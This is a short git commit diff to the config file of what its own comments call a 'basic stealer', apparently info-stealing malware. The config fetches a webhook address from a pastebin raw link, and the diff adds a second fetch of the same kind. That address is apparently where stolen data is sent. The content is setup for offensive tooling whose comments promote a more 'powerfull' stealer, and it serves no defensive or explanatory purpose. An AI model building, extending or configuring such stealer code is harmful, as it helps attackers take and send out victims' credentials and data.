e03171d44b8863fb92eec1f37b510b5e60493479
fuzzlesfixer <133809139+fuzzlesfixer@users.noreply.github.com>
2023-09-27 09:43:02 -0500

    Update config.py

--- scripts/config.py
+++ scripts/config.py
@@ -1,5 +1,5 @@
 import requests
 
 hook = requests.get("https://pastebin.com/raw/U-LINK-HERE").text # create a pastebin unlisted and put here, FORMAT RAW IMPORTANT
-
+hook2 = requests.get("https://pastebin.com/raw/U-LINK-HERE").text
 # soon new features xd. This is basic stealer, prysmax it's +++ powerfull
